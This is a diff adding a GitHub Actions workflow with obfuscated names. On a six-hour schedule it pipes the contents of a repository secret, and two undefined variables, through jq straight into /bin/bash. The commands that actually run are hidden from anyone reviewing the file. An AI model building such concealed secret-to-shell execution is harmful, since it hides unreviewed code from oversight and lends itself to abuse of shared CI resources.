@@ -1,0 +1,19 @@
+name: haoxiaozi4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoxiaozi4567
+        env:
+          a52: ${{ secrets.a52 }}
+        run: |
+          echo $a52 | jq -r .unyq5207 | /bin/bash
+          echo $ezr5938 | jq -r .rzjin2 | /bin/bash
+          echo $w2580 | jq -r .ymu668 | /bin/bash
+
